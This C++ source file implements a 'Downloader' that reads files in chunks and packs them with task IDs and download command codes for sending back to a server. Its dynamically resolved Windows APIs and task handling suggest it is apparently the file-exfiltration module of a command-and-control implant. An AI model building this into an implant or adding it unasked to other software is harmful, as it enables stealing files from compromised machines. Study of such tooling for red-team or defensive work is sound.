// 文件作用：下载任务状态机实现：把大文件按块读取并分多次回传给服务端。
#include "Downloader.h"
#include "utils.h"

// Downloader::operator new 使用本项目的内存分配函数创建下载器。
void* Downloader::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

// Downloader::operator delete 释放下载器对象占用的本地内存。
void Downloader::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(Downloader));
}

// Downloader 构造函数设置每次回传文件的块大小。
Downloader::Downloader(ULONG chunk_size)
{
	this->chunkSize = chunk_size;
}

// IsTasks 判断当前是否还有下载任务没处理完。
BOOL Downloader::IsTasks()
{
	if (this->downloads.size()) {
		for (int i = 0; i < this->downloads.size(); i++) {
			if (this->downloads[i].state == DOWNLOAD_STATE_RUNNING)
				return true;
		}
	}
	return false;
}

// CreateDownloadData 创建一个下载任务记录，保存文件句柄、大小和初始偏移。
DownloadData Downloader::CreateDownloadData(ULONG taskId, HANDLE hFile, ULONG64 size)
{
	DownloadData downloadData;
	downloadData.taskId   = taskId;
	downloadData.fileId   = GenerateRandom32();
	downloadData.hFile    = hFile;
	downloadData.fileSize = size;
	downloadData.index    = 0;
	downloadData.state    = DOWNLOAD_STATE_RUNNING;

	this->downloads.push_back(downloadData);

    return downloadData;
}

// ProcessDownloader 每轮读取一块文件内容并打包，直到下载完成或失败。
void Downloader::ProcessDownloader(Packer* packer)
{
	if ( !this->downloads.size() )
		return;
	
	for (int i = 0; i < downloads.size(); i++) {
		BOOL close = false;
		if (downloads[i].state == DOWNLOAD_STATE_RUNNING) {
			LPVOID buffer = MemAllocLocal(this->chunkSize);
			ULONG readedBytes = 0;
			ApiWin->ReadFile(downloads[i].hFile, buffer, this->chunkSize, &readedBytes, NULL);
			if (readedBytes > 0) {
				downloads[i].index += readedBytes;

				packer->Pack32(downloads[i].taskId);
				packer->Pack32(COMMAND_DOWNLOAD);
				packer->Pack32(downloads[i].fileId);
				packer->Pack8(DOWNLOAD_CONTINUE);
				packer->PackBytes( (BYTE*) buffer, readedBytes);

				if (downloads[i].fileSize == downloads[i].index)
					downloads[i].state = DOWNLOAD_STATE_FINISHED;
			}
			else {
				downloads[i].state = DOWNLOAD_STATE_CANCELED;

				packer->Pack32(downloads[i].taskId);
				packer->Pack32(COMMAND_DOWNLOAD_STATE);
				packer->Pack32(downloads[i].fileId);
				packer->Pack8(downloads[i].state);
			}
			if(buffer)
				MemFreeLocal(&buffer, this->chunkSize);
		}

		if ( downloads[i].state == DOWNLOAD_STATE_FINISHED ) {
			packer->Pack32(downloads[i].taskId);
			packer->Pack32(COMMAND_DOWNLOAD);
			packer->Pack32(downloads[i].fileId);
			packer->Pack8(DOWNLOAD_FINISH);
	    }

		if ( downloads[i].state == DOWNLOAD_STATE_CANCELED || downloads[i].state == DOWNLOAD_STATE_FINISHED ) {
			if (downloads[i].hFile) {
				ApiNt->NtClose(downloads[i].hFile);
				downloads[i].hFile = NULL;
			}

			downloads.remove(i);
			--i;
		}
	}
}